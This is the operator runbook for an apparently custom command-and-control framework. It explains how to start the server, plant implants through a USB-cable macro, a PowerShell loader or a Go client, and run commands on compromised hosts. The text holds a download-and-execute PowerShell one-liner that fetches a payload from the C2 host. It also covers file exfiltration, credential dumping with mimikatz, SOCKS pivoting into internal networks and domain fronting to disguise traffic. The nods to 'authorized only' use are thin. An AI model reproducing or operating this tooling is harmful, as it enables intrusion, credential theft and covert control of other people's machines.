# Runbook

End-to-end: start server, get a session, run commands.

## 1. Build and start the server

```bash
cd DreadPirateRoberts/c2
./build.sh
cd server
./c2server
```

Server listens on port 8443 (TLS). You’ll see:

- `GET /sync  GET /view  WS /live  GET/POST /op/sessions, /op/exec`
- `Operator: list | use <id> | exec <cmd> | exit`
- Prompt `> `

## 2. Optional: config.json (server directory)

Create or edit `server/config.json`:

- **sync_token** – If set, GET /sync only returns the payload when the request includes `?k=<sync_token>`. Use this in your macro URL: `https://HOSTPORT/sync?k=YOUR_TOKEN`.
- **op_token** – If set, GET /op/sessions and POST /op/exec require header `X-Op-Token: <op_token>` or query `?k=<op_token>`.

Session history is persisted to `c2_sessions.jsonl` in the server directory (append-only log of join/leave events). After a restart, live sessions are lost but you can see who was connected via **GET /op/sessions/history** (last 100 sessions, `id`, `addr`, `first_seen`, `last_seen`).

Example:

- **session_ttl_sec** – If set (e.g. `120`), sessions are closed after this many seconds with no activity. `0` = no expiry (default).

```json
{
  "port": 8443,
  "sync_token": "your-secret-sync-key",
  "op_token": "your-operator-key",
  "session_ttl_sec": 0
}
```

## 3. Get a session (implant)

**Option A: Macro (O.MG cable)**  
In `macros/sync.txt` or `sync-and-view.txt`, replace `HOSTPORT` with your server (e.g. `192.168.1.100:8443`). If you set `sync_token`, use:

`https://HOSTPORT/sync?k=YOUR_TOKEN`

in the loader one-liner (and in the macro STRING). Flash the macro to the cable and run it on the target (authorized only).

**Option B: Go client (testing)**  
On another machine (or same):

```bash
cd client
# Edit config.json: server_url = wss://YOUR_SERVER:8443/live
./client
```

**Option C: PowerShell (testing)**  
On a Windows box, run the loader (replace HOSTPORT and add `?k=TOKEN` if you use sync_token):

```powershell
$b=(New-Object Net.WebClient).DownloadString('https://HOSTPORT/sync')
iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))
```

**Option D: Linux/macOS (Go client)**  
Copy the built `client` binary and `server.crt` (and optionally `config.json`) to the target. Create `config.json` with `server_url: wss://YOUR_SERVER:8443/live`, `client_id`, and `client_secret` matching the server. Run `./client`. If the target has Go installed, you can instead build there: clone the repo, `cd client && go build -o client .`, then run with the same config.

When the implant connects, the server logs: `session xxxxxxxx connected`.

**Provisioned devices (optional):** Use **POST /op/provision** with body `{"alias": "cable1"}` (and op token). The server returns `client_id`, `client_secret`, and a provision string. Put those in your implant config (e.g. Go client `config.json`). When that implant connects, the session is tagged with the alias and shown in the UI. This allows multiple pre-registered “devices” (e.g. O.MG-style) without sharing the main server client_id/secret.

## 4. Operator: list, use, exec (stdin)

With the server running in the foreground:

- **list** – List session IDs and addresses.
- **use** \<id\> – Select a session (use the 8-char id from list).
- **exec** \<cmd\> – Run the command on the selected session; output prints when the client responds.
- **exit** – Quit the REPL (server keeps running).

Example:

```
> list
  a1b2c3d4  192.168.1.50:54321
> use a1b2c3d4
selected a1b2c3d4
> exec whoami
sent xyz
[a1b2c3d4] xyz: desktop-abc\user
>
```

## 5. Operator: HTTP API (no TTY)

When the server runs in the background or on a VPS, use the API (HTTPS, same port).

**List sessions**

```bash
curl -k https://localhost:8443/op/sessions
# If op_token set:
curl -k -H "X-Op-Token: YOUR_OP_TOKEN" https://localhost:8443/op/sessions
```

Response: `[{"id":"a1b2c3d4","addr":"192.168.1.50:54321"}]`

**Run command**

```bash
curl -k -X POST https://localhost:8443/op/exec \
  -H "Content-Type: application/json" \
  -d '{"session_id":"a1b2c3d4","command":"whoami"}'
# If op_token set, add: -H "X-Op-Token: YOUR_OP_TOKEN"
```

Response: `{"session_id":"a1b2c3d4","command_id":"...","status":"success","output":"desktop-abc\\user","error":""}`

The request blocks until the client responds or 90s timeout.

**Command queue (O.MG-style):** **POST /op/queue** with `{"session_id":"...","command":"..."}` adds a command to the session’s queue. The server sends the next queued command automatically when the implant sends a response. **GET /op/queue?session_id=...** lists the queue; **POST /op/queue/clear** with `{"session_id":"..."}` clears it.

**C2 traffic log:** **GET /op/c2log?session_id=&limit=200** returns a JSON array of `{ts, session_id, direction, detail}` (commands sent and responses). Optional `abridge=true` omits "out" rows. Log is appended to `c2_traffic.jsonl` in the server directory.

**Session config:** **GET /op/session_config?session_id=...** and **POST /op/session_config** with `{"session_id":"...","poll_seconds":60,"fast_seconds":5}` set per-session poll/timing hints (for display or future use).

## 6. View page

Open in a browser (ignore self-signed cert warning in lab):

`https://HOSTPORT/view`

Used by the macro `sync-and-view.txt` so the user sees the view page while the script runs.

## 7. Web UI (optional)

Build and serve the React UI, pointing it at the server:

```bash
cd web-ui
REACT_APP_API_URL=https://localhost:8443 npm start
# If server has op_token: REACT_APP_OP_TOKEN=your-key
```

Open http://localhost:3000. **Clients** lists sessions (from GET /op/sessions). **Console** lets you pick a session and run commands (POST /op/exec). See `web-ui/WEB_UI_API.md` for API details.

## 8. Health and kill

- **GET /op/health** – Same auth as other /op. Returns `{"ok": true, "sessions": N}`. Use for Dashboard or load balancers.
- **POST /op/kill** – Body `{"session_id": "..."}`. Closes the WebSocket and removes the session. Use to drop a beacon.

## 9. File API (upload, download, listdir)

Same auth as other /op (X-Op-Token or ?k=). Requires implant support (Go client and PowerShell implant support these).

- **POST /op/upload** – Body `{"session_id": "...", "path": "C:\\path\\to\\file", "content": "<base64>"}`. Response: `{"status", "output", "error"}`.
- **POST /op/download** – Body `{"session_id": "...", "path": "C:\\path\\to\\file"}`. Response: `{"status", "output", "error"}`; `output` is file content as base64.
- **POST /op/listdir** – Body `{"session_id": "...", "path": "."}`. Response: `{"status", "output", "error"}`; `output` is JSON array of `{name, dir, size}`.

See `web-ui/WEB_UI_API.md` for full details.

## 10. Run with Docker (C2 + UI)

To run only the C2 server and Web UI in Docker (no API gateway, db, or redis):

```bash
# From repo root (e.g. DreadPirateRoberts/c2). Generate certs first if not done:
cd DreadPirateRoberts/c2 && ./build.sh
# Then from that c2 directory:
docker-compose -f docker/docker-compose.c2-only.yml up --build
```

- **C2 server:** https://localhost:8443 (self-signed cert; accept in browser when the UI calls the API).
- **Web UI:** http://localhost:3000 — open this in your browser. The UI is built to call https://localhost:8443.

If the server uses `op_token`, rebuild the web-ui with build arg `REACT_APP_OP_TOKEN=your-key` (e.g. in the compose file or via `docker-compose build --build-arg REACT_APP_OP_TOKEN=your-key web-ui`).

## Multiple listeners

In `config.json` you can set `listeners` (array of `{port, tls, cert_file, key_file}`). If non-empty, the server starts one HTTP(S) server per listener; all serve the same routes. Use this to expose C2 on multiple ports or with/without TLS. Sync and WebSocket URLs depend on which listener you use (e.g. `https://host:8443/sync` vs `https://host:8444/sync`).

## Payload build (client)

From the repo root, `scripts/build_client.sh` builds the Go client. You can embed config so the binary works without `config.json` on target:

```bash
SERVER_URL=wss://c2.example.com/live CLIENT_ID=myid CLIENT_SECRET=secret ./scripts/build_client.sh
# Or: ./scripts/build_client.sh wss://c2.example.com/live myid mysecret
```

Optional env (or positional args): `CALLBACK_INTERVAL`, `JITTER_PERCENT`, `KILL_DATE`, `WORKING_HOURS_START`, `WORKING_HOURS_END`. Output: `client/client`.

## Credential harvesting

The C2 does not ship credential tools (e.g. Mimikatz). To harvest credentials: use **File Manager** to upload your preferred tool to the target, then use **Console** (or POST /op/exec) to run it. Example: upload `mimikatz.exe` to `C:\temp\`, then exec `C:\temp\mimikatz.exe sekurlsa::logonpasswords`. Store output or exfiltrate via download. Optional **Run creds** in the UI sends a `creds` command that may return a placeholder or minimal info per OS; extend the implant to run your own one-liner if desired.

## SOCKS proxy (pivot)

Set `socks_port` in server `config.json` (e.g. 1080). The server listens for SOCKS5 connections; when an operator connects (e.g. `curl --socks5 host:1080 http://internal-host/`), the server assigns the connection to the first available implant session and sends a connect request to the implant. The implant opens TCP to the target and relays traffic. PowerShell implant does not support SOCKS; use the Go client.

## Deploying behind a CDN (domain fronting)

You can put the C2 server behind a CDN (e.g. CloudFront, Cloudflare) so traffic appears to go to a front domain. Point implants at the CDN URL; the CDN forwards to your server (e.g. by host header or path). Use a custom Host header so the server only accepts requests for your fronted hostname. Optional: set `accept_hosts` in config (if implemented) so the server rejects requests whose Host header is not in the list. TLS SNI and Host header can differ (domain fronting). Document your CDN origin and routing so operators use the correct implant URL.

## Quick reference

| Item          | Value |
|---------------|--------|
| Sync URL      | `https://HOST:8443/sync` or `.../sync?k=TOKEN` |
| View URL      | `https://HOST:8443/view` |
| WebSocket     | `wss://HOST:8443/live` |
| GET /op/sessions | List `{id, addr}` (live only) |
| GET /op/sessions/history | List `{id, addr, first_seen, last_seen}` (last 100, persisted) |
| GET /op/health   | `{ok, sessions}` |
| POST /op/exec    | Body `{"session_id","command"}` |
| POST /op/kill    | Body `{"session_id"}` |
| POST /op/upload  | Body `{"session_id","path","content"}` (content base64) |
| POST /op/download| Body `{"session_id","path"}`; response output = base64 file |
| POST /op/listdir | Body `{"session_id","path"}`; response output = JSON list |
